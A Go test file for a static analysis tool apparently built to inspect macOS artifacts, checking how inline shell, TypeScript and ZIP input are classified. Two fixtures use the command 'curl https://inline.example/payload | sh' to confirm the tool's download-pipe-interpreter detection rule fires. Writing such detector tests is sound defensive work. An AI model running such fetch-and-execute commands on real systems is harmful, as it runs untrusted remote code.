package report

import (
	"archive/zip"
	"bytes"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
)

func inspectInlineShellForTest(command string, options artifact.Options) (Report, error) {
	return InspectInline([]byte(command), "shell", options)
}

func TestInspectInlineShellUsesOrdinaryStaticPipeline(t *testing.T) {
	rep, err := InspectInline([]byte("curl https://inline.example/payload | sh\n"), "shell", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if rep.Artifact != "<stdin:shell>" || len(rep.ArtifactNodes) != 1 || rep.ArtifactNodes[0].Kind != "script" {
		t.Fatalf("unexpected inline artifact: %#v", rep)
	}
	if len(rep.ExecutionRoots) != 1 || rep.ExecutionRoots[0].Kind != "script" {
		t.Fatalf("inline shell did not create one ordinary script execution root: %#v", rep.ExecutionRoots)
	}
	if !inlineReportHasRule(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("inline shell did not use ordinary extraction and rules: %#v", rep.Capabilities)
	}
	for _, diagnostic := range rep.Diagnostics {
		if strings.Contains(strings.ToLower(diagnostic), "resolved") {
			t.Fatalf("inline inspection unexpectedly resolved a local target: %#v", rep.Diagnostics)
		}
	}
}

func inlineReportHasRule(rep Report, ruleID string) bool {
	for _, capabilityMatch := range rep.Capabilities {
		if capabilityMatch.RuleID == ruleID {
			return true
		}
	}
	return false
}

func TestInspectInlineDoesNotReadNamedTargets(t *testing.T) {
	rep, err := InspectInline([]byte("node ./definitely-not-read.js\n"), "shell", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.ArtifactNodes) != 1 {
		t.Fatalf("inline inspection followed a named target: %#v", rep.ArtifactNodes)
	}
	if len(rep.Relationships) != 0 {
		t.Fatalf("inline inspection invented a target relationship: %#v", rep.Relationships)
	}
}

func TestInspectInlineKindsAndLimits(t *testing.T) {
	kinds := InlineInputKinds()
	if len(kinds) == 0 || strings.Join(kinds, ",") != "applescript,artifact,javascript,json,package-json,plist,python,shell,text,typescript" {
		t.Fatalf("inline input vocabulary = %#v", kinds)
	}
	if _, err := NormalizeInlineInputKind("auto"); err == nil {
		t.Fatal("removed auto input kind was accepted")
	}
	if _, err := InspectInline(nil, "unknown", artifact.Options{}); err == nil || !strings.Contains(err.Error(), "unsupported inline input kind") {
		t.Fatalf("unknown kind error = %v", err)
	}
	if _, err := InspectInline([]byte("12345"), "text", artifact.Options{MaxFileBytes: 4}); err == nil || !strings.Contains(err.Error(), "max file bytes 4") {
		t.Fatalf("file limit error = %v", err)
	}
}

func TestInspectInlineTypeScriptUsesJavaScriptSemantics(t *testing.T) {
	rep, err := InspectInline([]byte(`fetch("https://typescript.example/api")`), " TypeScript ", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, rep, "https://typescript.example/api")
}

func TestInspectInlineArtifactExpandsContainers(t *testing.T) {
	data := inlineZIP(t, "payload.txt", []byte("payload\n"))
	rep, err := InspectInline(data, "artifact", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if rep.Artifact != "<stdin:artifact>" || len(rep.ArtifactNodes) != 2 {
		t.Fatalf("in-memory artifact ZIP was not expanded: %#v", rep.ArtifactNodes)
	}
	if rep.ArtifactNodes[0].Kind != "zip" || rep.ArtifactNodes[1].LogicalPath != "<stdin>!payload.txt" {
		t.Fatalf("unexpected in-memory artifact graph: %#v", rep.ArtifactNodes)
	}

	disabled, err := InspectInline(data, "artifact", artifact.Options{DisableContainerExpansion: true})
	if err != nil {
		t.Fatal(err)
	}
	if len(disabled.ArtifactNodes) != 1 || disabled.ArtifactNodes[0].Kind != "zip" {
		t.Fatalf("disabled in-memory container expansion modeled children: %#v", disabled.ArtifactNodes)
	}
	if !strings.Contains(strings.Join(disabled.Diagnostics, "\n"), "container expansion skipped") {
		t.Fatalf("disabled container expansion lacks diagnostic: %#v", disabled.Diagnostics)
	}
}

func TestInspectInlineArtifactDoesNotForceGenericShellExecutionRoot(t *testing.T) {
	data := []byte("curl https://inline-neutral.example/payload | sh\n")
	generic, err := InspectInline(data, "artifact", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(generic.ArtifactNodes) != 1 || generic.ArtifactNodes[0].Kind != "text" {
		t.Fatalf("generic stdin artifact was not neutrally content-classified: %#v", generic.ArtifactNodes)
	}
	if len(generic.ExecutionRoots) != 0 {
		t.Fatalf("generic shell-like text was promoted to an execution root: roots=%#v", generic.ExecutionRoots)
	}
	if len(generic.Operations) != 0 || len(generic.Capabilities) != 0 {
		t.Fatalf("shell-like body without a selected host produced semantics: operations=%#v capabilities=%#v", generic.Operations, generic.Capabilities)
	}
	assertCoverageContains(t, generic, "text-semantics", "skipped", "no trusted interpreter")

	explicit, err := InspectInline(data, "shell", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(explicit.ExecutionRoots) != 1 || explicit.ExecutionRoots[0].Kind != "script" ||
		!inlineReportHasRule(explicit, "macos.download-pipe-interpreter") {
		t.Fatalf("explicit shell stdin was not promoted as a script root: roots=%#v capabilities=%#v", explicit.ExecutionRoots, explicit.Capabilities)
	}
}

func inlineZIP(t *testing.T, name string, data []byte) []byte {
	t.Helper()
	var out bytes.Buffer
	writer := zip.NewWriter(&out)
	entry, err := writer.Create(name)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := entry.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}
